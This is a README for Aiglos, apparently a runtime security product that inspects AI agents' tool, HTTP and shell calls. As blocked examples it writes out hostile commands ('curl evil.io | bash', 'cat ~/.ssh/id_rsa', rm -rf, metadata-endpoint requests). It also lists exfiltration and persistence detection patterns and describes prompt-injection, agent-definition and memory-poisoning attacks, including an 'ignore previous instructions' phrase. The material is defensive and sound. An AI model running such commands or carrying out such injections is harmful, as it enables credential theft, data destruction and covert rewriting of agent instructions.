<div align="center">

```
 █████╗ ██╗ ██████╗ ██╗      ██████╗ ███████╗
██╔══██╗██║██╔════╝ ██║     ██╔═══██╗██╔════╝
███████║██║██║  ███╗██║     ██║   ██║███████╗
██╔══██║██║██║   ██║██║     ██║   ██║╚════██║
██║  ██║██║╚██████╔╝███████╗╚██████╔╝███████║
╚═╝  ╚═╝╚═╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝
```

### We don’t care what protocol your agent uses. We watch what your agent actually does.

The first AI agent security platform that covers every surface, learns from every session,<br>
improves its own rules through adversarial co-evolution, and ships compliance artifacts automatically.

[![PyPI](https://img.shields.io/pypi/v/aiglos?style=flat-square&color=000&labelColor=000&label=aiglos)](https://pypi.org/project/aiglos/)
[![npm](https://img.shields.io/npm/v/aiglos?style=flat-square&color=000&labelColor=000&label=aiglos)](https://npmjs.com/package/aiglos)
[![MIT](https://img.shields.io/badge/license-MIT-000?style=flat-square&labelColor=000)](LICENSE)
[![Python 3.9+](https://img.shields.io/badge/python-3.9+-000?style=flat-square&labelColor=000)](https://python.org)
[![TypeScript](https://img.shields.io/badge/typescript-5.0+-000?style=flat-square&labelColor=000)](sdk/typescript/)
[![341 tests](https://img.shields.io/badge/tests-341_passing-000?style=flat-square&labelColor=000)](tests/)

|                      |                        |                       |                        |                       |                                         |
|----------------------|------------------------|-----------------------|------------------------|-----------------------|-----------------------------------------|
|**38** threat families|**3** execution surfaces|**6** campaign patterns|**Self-improving rules**|**Python + TypeScript**|**NDAA §1513 · EU AI Act · SOC 2 · CMMC**|

[The moment](#the-moment) · [What we built](#what-we-built) · [The white space](#the-white-space) · [Quickstart](#quickstart) · [Surfaces](#three-execution-surfaces) · [Threat engine](#threat-engine) · [Adaptive layer](#adaptive-layer) · [Autoresearch](#autoresearch--self-improving-rules) · [Campaign-mode](#t06-campaign-mode) · [Multi-agent](#multi-agent-security) · [Memory stacks](#using-memory-stacks) · [Skill scanner](#skill-scanner) · [Training data](#rl-training-data-integrity) · [CLI](#cli) · [TypeScript](#typescript-sdk) · [Attestation](#attestation) · [Pricing](#pricing)

</div>

-----

```
pip install aiglos        # Python
npm install aiglos        # TypeScript / Node.js
aiglos scan-skill <name>  # Free skill scanner — no install required at aiglos.dev/scan
```

```python
import aiglos  # every agent action below this line is inspected, attested, and learned from
```

-----

## The moment

In March 2026, seven events in under two weeks made AI agent security impossible to defer.

An autonomous agent selected McKinsey as a target with no human direction. It found 22 unauthenticated API endpoints, exploited SQL injection via JSON key reflection in error messages, and within two hours had full read-write access to 46.5 million chat messages, 728,000 files, 57,000 accounts, and every system prompt in the platform. The system prompts were writable. The agent modified them silently. For an unknown window, 40,000 consultants were operating a tool whose instructions had been replaced by an attacker. This was not a known vulnerability class. It was a new category: machine-speed, fully autonomous, invisible to every existing tool because those tools were watching individual calls, not the campaign that assembled them.

SecurityScorecard found 135,000 agent instances exposed to the public internet with authentication bypass. A repository of 120 specialized sub-agents hit 31,000 stars with an install path that writes directly into the directory that reprograms every future AI session on the host — no malware required, just file writes. JFrog found a malicious npm package posing as a major AI agent framework installer, live on launch day, deploying a persistent remote access tool that harvested SSH keys, AWS credentials, browser passwords, and crypto wallets. The payload was AES-256-GCM encrypted and downloaded at runtime. VirusTotal saw a clean package. Traditional malware scanning is architecturally blind to this attack class.

Nvidia dropped a 120-billion-parameter open-weight model with a 1-million-token context window. An agent running this model locally — on hardware you can buy today — can load an entire corporate codebase into a single context window, map every credential and authentication flow, synthesize an exfiltration strategy entirely in-context, and emit a single minimally suspicious API call. Every existing per-call security scanner sees nothing. The reconnaissance never appears in any log.

A major AI lab published its own threat model rating three attack surfaces as Critical P0 with no current runtime mitigation. Their recommended fix for all three: “planned improvements.”

The security runtime for AI agents does not exist anywhere in production. We built it. We shipped it in the middle of the incidents — the T30 SUPPLY_CHAIN rule was catching GhostClaw-pattern attacks while the CVE was still being written. The T36_AGENTDEF rule gates writes to agent definition directories before they land. The T06 campaign engine catches the McKinsey/Lilli attack class as a session sequence, not as individual events.

This is that platform.

-----

## What we built

Aiglos is the only AI agent security product that covers all three execution surfaces agents actually use — MCP tool calls, direct HTTP/API calls, and subprocess/CLI execution — in a single platform, with a feedback loop from production sessions back into rule calibration, and scientific validation of every rule that ships.

The complete inventory of what exists and is shipping today:

**Three-surface interception.** MCP tool calls, direct HTTP/API calls (patches `requests`, `httpx`, `aiohttp`, `fetch()`), and subprocess/CLI execution (patches `subprocess.run`, `subprocess.Popen`, `child_process`). No proxy. No port. No config. Attaches at process import time. Works regardless of which agent framework, protocol version, or library version the agent uses. Clean calls pass in under 1ms.

**38 threat families, T01-T38.** Protocol-portable attack detection. Shell injection, SSRF, credential harvest, path traversal, privilege escalation, persistence mechanisms, lateral movement, data exfiltration, prompt injection, context poisoning, supply chain attacks, agent definition file poisoning, autonomous financial execution, sub-agent spawning, and 24 more. Every rule has test coverage. Every rule maps to MITRE ATLAS.

**Three-tier blast radius classification.** Tier 1 auto-allow (git status, linters, read-only ops). Tier 2 monitored (file writes, package installs, git commits — allowed with compensating transaction logged). Tier 3 gated (destructive commands, privilege ops, agent def writes — block, pause-with-webhook, or warn). Tier 3 pause mode integrates with PagerDuty, Slack, and ServiceNow via signed approval tokens.

**T06 campaign-mode.** Six patterns that catch multi-step attack sequences invisible to per-call inspection. Reconnaissance sweeps, credential accumulation, exfil setup, persistence chains, lateral preparation, and the AGENTDEF_CHAIN pattern that catches the McKinsey/Lilli attack class — agent definition read followed by write in the same session.

**Semantic agent definition integrity.** Snapshots agent definition files at session start. Scores every modification on a 0.0–1.0 semantic divergence scale using token overlap, a 23-phrase injection signal corpus, structural divergence, and length ratio. A hash tells you the file changed. The semantic score tells you whether it is maintenance or an adversarial injection.

**Multi-agent spawn registry.** Registers every child agent spawn (T38). The full parent-to-child action chain is in the artifact. Child agents inherit the parent’s learned policy rather than starting from global defaults.

**Session identity chain.** Every event is HMAC-SHA256 countersigned. Every artifact is tamper-evident. `public_token` embedded in header for offline verification without exposing the session secret.

**Adaptive layer.** Every session artifact is ingested into a local SQLite observation graph. Seven inspection triggers surface rule degradation, false positives, and bypass accumulation automatically. The amendment engine proposes specific changes grounded in session evidence. The policy serializer derives child agent policies from parent history. Nothing changes without explicit human approval.

**Autoresearch — self-improving rules.** An LLM-driven two-loop system that optimizes detection rules against labeled test cases and simultaneously generates adversarial evasions. Rules and attacks co-evolve. A rule that survives 20 autoresearch cycles has been stress-tested against adversarially generated evasion attempts, not just the original labeled corpus. Every cycle produces a run log that is itself NDAA §1513 compliance evidence: TPR, FPR, adversarial cases tested, timestamps, and git commits.

**Free skill scanner.** `aiglos scan-skill <name>` runs 8 risk signals against any ClawHub, SkillsMP, npm, or PyPI package in under 2 seconds. Catches social engineering in READMEs, permission scope anomalies, publisher reputation signals, and obfuscated payloads. VirusTotal cannot score these signals. We scanned 10,700 ClawHub skills. 820 are confirmed malicious.

**RL training data integrity.** `sign_trajectory()` on the hermes batch runner. Generates thousands of tool-calling trajectories for RL training. If a trajectory contains unsafe tool calls, the model learns those patterns as acceptable. Aiglos signs each trajectory with a record of blocked and warned calls before it enters the training pipeline. This is “secure your training data,” not just “secure your production agent.”

**Python and TypeScript SDKs.** Complete T01-T38 detection engine in both languages. The majority of production coding agent deployments are TypeScript-first. A Python-only SDK is a real market blocker. Cursor, Claude Code, Copilot extensions, n8n, and enterprise agent orchestration are on Node.js.

**Signed attestation artifacts.** Every session close produces a signed record. NDAA §1513 (June 16, 2026), EU AI Act Article 15 (August 2, 2026), CMMC Level 2, SOC 2 Type II. Auto-generated. No separate documentation workflow.

-----

## The white space

The AI agent security space currently consists of point solutions: prompt scanners, pre-deployment red-teaming tools, container isolation systems. Each covers one surface. None of them produce a unified artifact. None of them learn. None of them cover the coding agent surface, which is where the majority of deployed AI agents actually operate.

**The point solution failure mode.** A prompt scanner blocks malicious content in MCP responses but cannot see the subprocess the agent runs after the MCP call returns. An API security tool monitors HTTP traffic but does not know what command-line operations the agent executed before or after. A container isolation system limits blast radius but produces no auditable record of what the agent actually did inside the container. None of these tools share data. The attack that sequences through all three surfaces — reconnaissance via a clean-looking file read, credential harvest via a monitored API call, exfiltration via a subprocess that looks like a logging operation — is invisible to the entire stack.

**The coding agent surface no one covers.** Cursor, Claude Code, GitHub Copilot, Aider, Windsurf. None of them use MCP. They call `subprocess.run()` and `requests.post()` directly. Any tool built on the assumption that MCP is the universal agent protocol is blind to the majority of deployed AI agents. Aiglos covers this surface because the threat detection logic is protocol-portable — the same T07 rule catches shell injection whether it travels through an MCP terminal tool or a direct `subprocess.run()` call.

**The static rule degradation problem.** Every existing tool ships with detection patterns calibrated at a point in time. When agent behavior changes — new model, framework update, different task distribution — the rules drift out of calibration. The tool keeps firing at its historical rate, or stops firing entirely, and no one knows. The only way to surface this drift before it becomes an incident is an observation graph that accumulates session data and measures firing rate trends over time. That graph does not exist anywhere else.

**The campaign-mode blind spot.** Per-call inspection cannot see multi-step attack sequences. A `git log` is clean. A `cat .env` fires T19. But the sequence matters. The McKinsey/Lilli attack was clean at the level of individual API calls — reading a writable system prompt, then writing a new one. The AGENTDEF_CHAIN pattern catches exactly this because it watches the session, not the call. No tool that does only per-call inspection can build this.

**The autoresearch moat.** A 32-case labeled adversarial corpus that co-evolves with each optimization cycle cannot be replicated quickly. It represents months of adversarial testing. Every rule that ships from autoresearch has been validated against evasion attempts generated by a capable model specifically trying to break it. The corpus grows harder over time. The moat compounds.

**The training data surface.** AI security tools focus on production agents. No one is asking: what happens when the agents being secured are generating the training data for the next generation of models? If a trajectory contains a T07 shell injection that the agent executed, and that trajectory enters the RL pipeline unsigned, the model learns that shell injection is acceptable agent behavior. `sign_trajectory()` closes this loop. It does not exist anywhere else.

-----

## Live output

```
09:14:22.187  ✓  filesystem.read_file      path=/var/log/app.log             [T1 auto-allow, 0.3ms]
09:14:22.698  ✗  shell.execute             rm -rf /etc ── T07 SHELL_INJECT   [T3 blocked, 0.6ms]
09:14:23.214  ✗  http.post                 api.stripe.com/v1/charges ──────── T37 FIN_EXEC
09:14:23.744  ✗  network.fetch             http://169.254.169.254/ ─────────── T25 SSRF
09:14:24.519  ⚠  subprocess.run            cat ~/.ssh/id_rsa ─── T19 CRED_ACCESS [T2 monitored]
09:14:24.778  ⚠  subprocess.run            pip install requests ─── T2 MONITORED
                                           compensating: pip uninstall requests
09:14:25.012  ⚠  subprocess.run            claude code --print ─── T38 AGENT_SPAWN [registered]
09:14:25.267  ✗  subprocess.run            cp SOUL.md ~/.claude/agents/ ── T36_AGENTDEF [T3]
09:14:25.521  ✓  database.query            SELECT * FROM orders LIMIT 100    [T1 auto-allow, 0.2ms]

[session close — 1.4s total]
  47 events  ·  4 blocked  ·  3 warned  ·  40 allowed
  Semantic: SOUL.md modified — score 0.91 — HIGH (injection signals detected)
  Campaign: CREDENTIAL_ACCUMULATE detected — confidence 84%
  Adaptive: 2 triggers fired, 1 amendment proposed
  Autoresearch: T19 rule TPR=0.94 FPR=0.06 (20 adversarial cycles)
  Artifact: HMAC signed — NDAA §1513 ready — EU AI Act Article 15 ready
```

-----

## Quickstart

### Python

```python
import aiglos

aiglos.attach(
    agent_name="my-agent",
    policy="enterprise",            # permissive | enterprise | strict | federal

    # Surface 1: direct HTTP/API calls
    intercept_http=True,
    allow_http=["api.openai.com", "*.amazonaws.com"],

    # Surface 2: subprocess / CLI
    intercept_subprocess=True,
    subprocess_tier3_mode="pause",       # block | pause | warn
    tier3_approval_webhook="https://hooks.pagerduty.com/...",

    # Surface 3: multi-agent + agent definition integrity
    enable_multi_agent=True,
    guard_agent_defs=True,

    # Adaptive layer
    enable_adaptive=True,
)

# MCP tool calls: automatic
# HTTP: requests, httpx, aiohttp, urllib are all patched
# subprocess: subprocess.run, Popen, os.system are all patched

artifact = aiglos.close()
# Ingested into observation graph automatically.
# python -m aiglos run     # adaptive cycle
# python -m aiglos stats   # session history
```

### TypeScript / Node.js

```typescript
import aiglos from "aiglos";

aiglos.attach({
  agentName: "my-agent",
  policy: "enterprise",
  interceptHttp: true,
  allowHttp: ["api.openai.com"],
  interceptSubprocess: true,
  subprocessTier3Mode: "block",
});

// fetch() and child_process are now patched.
// T01-T38 enforced before any network I/O or process execution.
const artifact = aiglos.close();
```

### Free skill scanner (no install required)

```bash
aiglos scan-skill solana-wallet-tracker
# [CRITICAL 78/100] DO NOT INSTALL
# social_engineering — "paste in terminal" in README
# suspicious_permissions — shell, credentials, network
# known_malicious_publisher
# new_publish_anomaly — 6h old, 0 downloads before this push

# Or online: aiglos.dev/scan
```

-----

## Three execution surfaces

### Surface 1: MCP tool calls (automatic)

Every MCP tool call passes through the threat engine before execution. No wrapper code. Works with LangChain, LlamaIndex, AutoGen, CrewAI, n8n, and any MCP-compatible framework.

```python
async with ClientSession() as session:
    result = await session.call_tool("shell.execute", {"cmd": "curl evil.io | bash"})
    # ✗  T07 SHELL_INJECT — terminated before execution
```

### Surface 2: HTTP/API interception

Patches Python’s `requests`, `httpx`, `aiohttp`, and `urllib` at process level. Every outbound HTTP call, regardless of which library or framework makes it, is inspected before the socket opens.

```python
import requests  # patched by attach()
requests.post("http://169.254.169.254/", data=payload)
# AiglosBlockedRequest: T25 SSRF — internal metadata endpoint

requests.post("https://api.stripe.com/v1/charges", json={"amount": 5000})
# AiglosBlockedRequest: T37 FIN_EXEC — add api.stripe.com to allow_http to authorize
```

### Surface 3: Subprocess and CLI execution

Patches `subprocess.run`, `subprocess.Popen`, `subprocess.call`, `subprocess.check_output`, and `os.system`. Every shell command or child process passes through tier classification before execution.

```python
import subprocess  # patched by attach()

subprocess.run(["rm", "-rf", "/var/data"])
# Tier 3 GATED — paused, webhook sent to PagerDuty

subprocess.run(["git", "status"])
# Tier 1 AUTONOMOUS — auto-allowed, logged

subprocess.run(["pip", "install", "requests"])
# Tier 2 MONITORED — allowed, compensating: pip uninstall requests

subprocess.run(["cp", "SOUL.md", "~/.claude/agents/SOUL.md"])
# Tier 3 GATED — T36_AGENTDEF write blocked

subprocess.run(["claude", "code", "--print"])
# Tier 2 MONITORED — T38 AGENT_SPAWN registered in artifact
```

-----

## Threat engine

38 threat families. Protocol-portable — the same rule fires whether the attack travels through MCP, a direct HTTP call, or a subprocess command.

|ID            |Family                                               |Surface        |What it catches                                                                                            |
|--------------|-----------------------------------------------------|---------------|-----------------------------------------------------------------------------------------------------------|
|`T01`         |EXFIL                                                |HTTP/subprocess|Credential and data exfiltration via network calls                                                         |
|`T02`         |INJECT                                               |MCP            |SQL, command, code injection via tool parameters                                                           |
|`T03`         |TRAVERSAL                                            |MCP/subprocess |Path traversal and directory escape                                                                        |
|`T04`         |CONFIG                                               |MCP            |Misconfiguration: exposed instances, missing auth, unsafe bindings                                         |
|`T05`         |SSRF                                                 |HTTP           |Internal range access via agent-controlled URLs                                                            |
|`T06`         |GOAL_DRIFT                                           |Cross-surface  |Campaign-mode: multi-step sequences invisible to per-call inspection                                       |
|`T07`         |SHELL_INJECT                                         |subprocess     |Metacharacters and command substitution in shell args                                                      |
|`T08`         |PATH_TRAVERSAL                                       |subprocess     |`../` sequences in command arguments                                                                       |
|`T09`         |TOKEN_LEAK                                           |MCP/HTTP       |Bearer token and OAuth credential exposure                                                                 |
|`T10`         |PRIV_ESC                                             |subprocess     |`sudo`, `su`, `doas`, `pkexec` from agent processes                                                        |
|`T11`         |PERSISTENCE                                          |subprocess     |`crontab`, `systemctl enable`, `launchctl`, `.bashrc` writes                                               |
|`T12`         |LATERAL_MOVEMENT                                     |subprocess     |SSH spawning to undeclared hosts, `nmap`, `masscan`                                                        |
|`T13`–`T18`   |NETWORK · DNS · REFLECTION · DESER · TEMPLATE · XPATH|Mixed          |Network, code execution, injection vectors                                                                 |
|`T19`         |CRED_ACCESS                                          |subprocess/HTTP|SSH key, credential file, environment variable access                                                      |
|`T20`         |DATA_EXFIL                                           |HTTP           |PII patterns in outbound request bodies                                                                    |
|`T21`         |ENV_LEAK                                             |subprocess     |`env`, `printenv` piped or redirected externally                                                           |
|`T22`         |RECON                                                |HTTP           |OSINT and enumeration endpoint calls                                                                       |
|`T23`         |EXFIL_SUBPROCESS                                     |subprocess     |`curl -d`, `wget --post-data`, `nc` data sends                                                             |
|`T24`         |DATA_AGENT                                           |HTTP           |Analytics and BI APIs receiving raw agent data                                                             |
|`T25`         |CONFUSED_DEP                                         |HTTP           |SSRF, cross-origin forwarding, internal metadata endpoints                                                 |
|`T26`         |SUPPLY_CHAIN                                         |HTTP           |Package index publish, typosquatting, dependency confusion                                                 |
|`T27`         |PROMPT_INJECT                                        |MCP            |Indirect prompt injection, writable system prompts                                                         |
|`T28`         |CONTEXT_POISON                                       |MCP            |Context window manipulation and hijacking                                                                  |
|`T29`         |A2A                                                  |MCP            |Agent-to-agent protocol attacks, cross-agent privilege escalation, fleet coordination, Agent Card exploits |
|`T30`         |REGISTRY_MONITOR                                     |HTTP           |Live scanning of npm, PyPI, ClawHub, SkillsMP — publisher reputation, obfuscated payloads, permission scope|
|`T31`         |MEMORY_POISON                                        |MCP            |RAG and persistent memory write-time scanning                                                              |
|`T32`         |CREDENTIAL                                           |MCP/HTTP       |20+ secret family patterns across all surfaces                                                             |
|`T33`         |JAILBREAK                                            |MCP            |Jailbreak attempts and system prompt extraction                                                            |
|`T34`         |MODEL_EXFIL                                          |HTTP           |Model weight and training data transfer patterns                                                           |
|`T35`         |PERSONAL_AGENT                                       |MCP            |Calendar, email, contact, and identity access                                                              |
|`T36_AGENTDEF`|AGENT_DEF_WRITE                                      |subprocess     |Writes to agent definition dirs — semantic risk scored                                                     |
|`T37`         |FIN_EXEC                                             |HTTP           |Autonomous financial transaction execution                                                                 |
|`T38`         |AGENT_SPAWN                                          |subprocess     |Sub-agent spawning without session policy propagation                                                      |

### Tier classification

**Tier 1 — AUTONOMOUS.** Read-only ops, git read commands, linters, package listing. Auto-allowed, logged, <1ms overhead.

**Tier 2 — MONITORED.** File writes, git commits, package installs. Allowed with compensating transaction logged in the artifact.

**Tier 3 — GATED.** `rm -rf`, `terraform destroy`, `kubectl delete`, `git push --force`, `DROP TABLE`, agent def writes, privilege ops. Configurable:

- `block` — raises `AiglosBlockedSubprocess` immediately
- `pause` — blocks and emits signed webhook; resumes on approval token
- `warn` — logs and allows (development)

T07 SHELL_INJECT, T10 PRIV_ESC, T11 PERSISTENCE, and T36_AGENTDEF writes always force Tier 3 regardless of the command classifier.

-----

## Adaptive layer

The detection engine catches what it was programmed to catch. The adaptive layer surfaces what is drifting, degrading, or accumulating as a pattern — things that only become visible across sessions.

```
observe ──► inspect ──► amend ──► evaluate
   │                                  │
   └──────── session artifact ◄───────┘
             (auto-ingested at aiglos.close())
```

### Observation graph

```python
from aiglos.adaptive import ObservationGraph

graph = ObservationGraph()          # ~/.aiglos/observations.db
stats = graph.rule_stats("T37")
# RuleStats(fires_total=47, blocks_total=31, warns_total=12,
#           sessions_seen=18, block_rate=0.66, trend="ACTIVE")
```

### Seven inspection triggers

|Trigger          |When it fires                                              |
|-----------------|-----------------------------------------------------------|
|`RATE_DROP`      |Rule firing rate drops >40% from 30-session baseline       |
|`ZERO_FIRE`      |Active rule goes completely silent                         |
|`HIGH_OVERRIDE`  |Tier 3 ops consistently webhook-approved in this deployment|
|`AGENTDEF_REPEAT`|Same agent def path modified across multiple sessions      |
|`SPAWN_NO_POLICY`|Child agents spawning without inherited policy             |
|`FIN_EXEC_BYPASS`|T37 overrides accumulating on specific hosts               |
|`FALSE_POSITIVE` |Rule fires but >60% result in WARNs, not BLOCKs            |

### Amendment proposals — evidence-based, human-approved

```bash
$ python -m aiglos amend list

  a3f8c1d2  [allow_http]  rule=T37
    Bypassed 5 times. Evidence: api.stripe.com/v1/charges appears in 5 sessions,
    0 unauthorized endpoints in those sessions. Proposed: add to allow_http.

$ python -m aiglos amend approve a3f8c1d2
  ✓ Approved: a3f8c1d2
```

Amendment history is the audit trail for the security controls themselves — showing why the rules are what they are, not just what they caught.

### Policy inheritance for spawned agents

```python
policy = PolicySerializer(graph).derive("parent-session-id")
# SessionPolicy(
#   evidence_sessions=34,
#   inherited_allow_http=["api.stripe.com"],
#   tier_overrides={"T_DEST": "tier2"},
#   suppressed_rules=["T22"],
# )
```

A child agent starting with 34 sessions of calibration is immediately more accurate than any fresh deployment. That context compounds and cannot be replicated from scratch.

-----

## Autoresearch — self-improving rules

Inspired by Karpathy’s autonomous ML research pattern. Two co-evolving loops that make detection rules progressively harder to evade.

```
Loop A (research):   generate rule variants → evaluate against corpus → commit winner
Loop B (adversarial): generate evasion cases → add successful evasions to corpus
                      ↓ repeat every N cycles
The corpus grows harder. Rules that survive are adversarially validated.
```

Every rule that ships from autoresearch has a run log showing:

- True positive rate against a documented, labeled test corpus
- False positive rate against the same corpus
- Number of adversarial evasion cases the rule was tested against
- Git commits for each optimization cycle with fitness metrics

This run log is NDAA §1513 compliance evidence. It documents how the detection capability was developed, tested, and validated — exactly what federal AI auditors are starting to ask for.

```bash
# Run the credential exposure detection optimization
python -m aiglos autoresearch --category CRED_ACCESS --rounds 20 --adversarial

# Rounds 1-20:
# [Round 1]  baseline TPR=0.75 FPR=0.12 fitness=0.67
# [Round 5]  variant_4 TPR=0.88 FPR=0.08 fitness=0.80  ← committed
# [Round 10] adversarial: 3 evasion cases added to corpus
# [Round 15] variant_9 TPR=0.94 FPR=0.06 fitness=0.88  ← committed
# [Round 20] 32 labeled cases, 11 adversarial, 0 regressions
#
# python -m aiglos autoresearch --category CRED_ACCESS --report
# NDAA §1513 experiment log generated: autoresearch/logs/CRED_ACCESS_20260311.json
```

Available categories: `CRED_ACCESS`, `PROMPT_INJECT`, `SHELL_INJECT`, `SSRF`, `SUPPLY_CHAIN`, and custom categories via labeled JSONL corpus.

-----

## T06 campaign-mode

Per-call inspection cannot see sequences. Campaign-mode can.

A session that does `git log → ls -la → cat package.json → cat .env.example → cat .env` is a reconnaissance sweep even though no individual call is catastrophic. The Nemotron Super threat amplifies this: a 1-million-token context window can absorb an entire codebase, map every credential and auth flow in-context, and emit a single clean-looking API call. The reconnaissance is invisible to any scanner that watches one call at a time.

Six patterns running automatically in every `aiglos.adaptive_run()`:

|Pattern                |Sequence                              |Confidence|What it catches                                           |
|-----------------------|--------------------------------------|----------|----------------------------------------------------------|
|`RECON_SWEEP`          |T19 → T19/T08, no build activity      |0.75+     |Sequential credential/config reads without legitimate work|
|`CREDENTIAL_ACCUMULATE`|T19 fires 3+ times on distinct paths  |0.80+     |Systematic access to SSH keys, AWS creds, .env files      |
|`EXFIL_SETUP`          |T19/T08 recon → T23/T12 outbound      |0.85+     |Harvest credentials, then establish outbound channel      |
|`PERSISTENCE_CHAIN`    |T10 priv esc → T11 persistence write  |0.90+     |Escalate, then write startup entry                        |
|`LATERAL_PREP`         |T19 cred harvest → T12/T22 scan       |0.85+     |Credential harvest followed by network enumeration        |
|`AGENTDEF_CHAIN`       |T36_AGENTDEF read → T36_AGENTDEF write|0.88+     |McKinsey/Lilli attack class                               |

`AGENTDEF_CHAIN`: read `~/.claude/agents/security-engineer.md` to understand the agent’s instructions, then write a modified version. Each event is legitimate in isolation. The sequence reveals the campaign. No per-call tool can see this.

```python
from aiglos.adaptive.campaign import CampaignAnalyzer

results = CampaignAnalyzer(graph).analyze_recent(hours=24)
# [HIGH] AGENTDEF_CHAIN — confidence 88%
#   Agent definition read followed by write in the same session.
#   McKinsey/Lilli attack pattern. Treat as HIGH priority.
```

-----

## Multi-agent security

### T36_AGENTDEF — agent definition file gating

Any file placed in `~/.claude/agents/` silently reprograms every future Claude Code session on the host. The agency-agents repository with 31,000 GitHub stars installs via `cp -r agency-agents/* ~/.claude/agents/`. Aiglos catches this at the subprocess layer, before the write lands, with a semantic risk score so you know whether it is maintenance or an injection.

|Framework     |Protected path                                   |On write    |On read         |
|--------------|-------------------------------------------------|------------|----------------|
|Claude Code   |`~/.claude/agents/`                              |Tier 3 GATED|Tier 2 MONITORED|
|Cursor        |`.cursor/rules/`                                 |Tier 3 GATED|Tier 2 MONITORED|
|OpenClaw      |`~/.openclaw/`                                   |Tier 3 GATED|Tier 2 MONITORED|
|GitHub Copilot|`~/.github/agents/`                              |Tier 3 GATED|Tier 2 MONITORED|
|Windsurf      |`.windsurfrules`                                 |Tier 3 GATED|Tier 2 MONITORED|
|Gemini CLI    |`~/.gemini/agents/`                              |Tier 3 GATED|Tier 2 MONITORED|
|Any           |`SOUL.md`, `IDENTITY.md`, `AGENTS.md`, `SKILL.md`|Tier 3 GATED|Tier 2 MONITORED|

### Semantic scoring — beyond hash comparison

|Modification                          |Semantic score|Risk  |
|--------------------------------------|--------------|------|
|Added bullet to `## Steps`            |0.05          |LOW   |
|Rewrote trigger condition             |0.28          |MEDIUM|
|Restructured file, same intent        |0.45          |MEDIUM|
|Added “ignore previous instructions”  |0.91          |HIGH  |
|Replaced with credential exfil routing|0.97          |HIGH  |

23-phrase injection signal corpus. Token Jaccard overlap. Structural divergence. No external dependencies. Runs at session close.

### T37 FIN_EXEC — financial transaction execution gated by default

Stripe (charges, transfers, payouts, payment_intents), PayPal, Square, Braintree, Adyen, Ethereum RPC (`eth_sendTransaction`, `eth_sendRawTransaction`), Coinbase, Binance, Kraken, Dwolla, Plaid Transfer. Read-only (GET) always allowed. Add the host to `allow_http` to explicitly authorize an endpoint — this creates an auditable record that a human made the decision.

### T38 AGENT_SPAWN + policy inheritance

Child agents inherit the parent’s learned policy from the observation graph. 34 sessions of parent calibration is 34 sessions the child does not need to discover from scratch.

-----

## Using memory stacks?

The three-tier memory architecture — `CLAUDE.md` for session context, `MEMORY.md` for persistent observations, an Obsidian vault as a searchable knowledge graph — creates an attack surface that grows with how well you use it. The more your agent knows about your architecture, your credentials, and your conventions, the more damage a compromised session can do.

Every write target the memory stack recommends is monitored at the runtime layer:

|Memory component          |Attack vector                              |Aiglos rule                     |
|--------------------------|-------------------------------------------|--------------------------------|
|`SOUL.md` / `CLAUDE.md`   |System prompt hijack via write             |T36_AGENTDEF + T27 PROMPT_INJECT|
|`MEMORY.md` / `USER.md`   |Inject persistent false beliefs            |T31 MEMORY_POISON               |
|`AGENTS.md` / agent config|Tamper with agent behavior between sessions|T36_AGENTDEF GATED              |
|`~/.claude/agents/`       |Silent agent reprogramming via cp/mv       |T36_AGENTDEF GATED              |
|`cron/` / `HEARTBEAT.md`  |Schedule unauthorized execution cycles     |T11 PERSISTENCE                 |
|Obsidian vault via MCP    |Poisoned notes retrieved into context      |T28 CONTEXT_POISON              |
|`~/.hermes/.env` / secrets|Credential harvest during memory access    |T19 CRED_ACCESS                 |
|`delegate_task`           |Spawn undeclared sub-agents outside scope  |T29 A2A                         |

The session artifact at close is itself part of the memory stack: a signed record of every tool call the agent made, ready to load into the next session as verified provenance.

-----

## Using OpenClaw?

OpenClaw published its own threat model rating six attack surfaces as Critical or High with no current runtime mitigation:

|OpenClaw threat                            |Their own residual risk rating        |Aiglos rule      |
|-------------------------------------------|--------------------------------------|-----------------|
|T-EXEC-001 direct prompt injection         |Critical — detection only, no blocking|T27 PROMPT_INJECT|
|T-EXEC-004 exec approval bypass            |High — no command sanitization        |T07 SHELL_INJECT |
|T-EXFIL-001 data theft via web_fetch       |High — external URLs permitted        |T01 EXFIL        |
|T-EXFIL-003 credential harvesting via skill|Critical — no mitigation              |T19 CRED_ACCESS  |
|T-IMPACT-001 unauthorized command execution|Critical — host exec without sandbox  |T07 + T08        |
|T-PERSIST-003 agent configuration tampering|Medium — file permissions only        |T36_AGENTDEF     |

Their own words on what VirusTotal does not cover: “A skill that uses natural language to instruct an agent to do something malicious won’t trigger a virus signature. A carefully crafted prompt injection payload won’t show up in a threat database.”

Aiglos is the runtime layer VirusTotal is not. A drop-in `SKILL.md` is at [`skills/openclaw/SKILL.md`](skills/openclaw/SKILL.md).

-----

## Using coding agents? (Cursor, Claude Code, Copilot, Aider)

Coding agents do not use MCP. They use `subprocess.run()` and `requests.post()` directly. Any MCP-only tool misses this entire surface.

|Risk                                                     |Aiglos coverage                   |
|---------------------------------------------------------|----------------------------------|
|Agent deletes production environment                     |Tier 3 GATED — T_DEST             |
|Agent reads `~/.ssh/id_rsa`                              |T19 CRED_HARVEST monitored        |
|Agent writes to `.cursor/rules/` (rule poisoning)        |T36_AGENTDEF Tier 3 GATED         |
|Agent spawns another Claude Code session                 |T38 AGENT_SPAWN registered        |
|Agent POSTs to Stripe autonomously                       |T37 FIN_EXEC BLOCKED              |
|Agent runs `git push --force`                            |Tier 3 GATED                      |
|Agent installs package from unknown source               |T2 MONITORED + compensating logged|
|Multi-step recon sequence                                |T06 CAMPAIGN detected             |
|Reconnaissance entirely in-context (Nemotron Super class)|T06 RECON_SWEEP pattern           |

-----

## Using hermes-agent?

hermes-agent generates tool-calling trajectories for RL training. If a trajectory contains unsafe tool calls, the model learns those patterns as acceptable. Aiglos covers the full hermes tool surface and adds a unique capability: **RL training trajectory signing.**

```python
from aiglos.integrations.hermes import HermesGuard

guard = HermesGuard(agent_name="hermes", policy="enterprise")
guard.on_heartbeat()

result = guard.before_tool_call("terminal", {"command": cmd})
if result.blocked:
    raise RuntimeError(result.reason)

# Sign trajectories before they enter the RL pipeline
signed = guard.sign_trajectory(trajectory_dict)
# signed["_aiglos"] — artifact_id, signature, blocked_calls, warned_calls

artifact = guard.close_session()
```

hermes-specific attack surface — every feature the architecture introduces:

|hermes feature                  |Attack vector                                |Aiglos rule        |
|--------------------------------|---------------------------------------------|-------------------|
|`SOUL.md`                       |Hijack agent core instructions               |T27 + T36_AGENTDEF |
|`MEMORY.md` / `USER.md`         |Inject persistent false beliefs              |T31 MEMORY_POISON  |
|`cron/` + `HEARTBEAT.md`        |Tamper with scheduled cycles                 |T11 PERSISTENCE    |
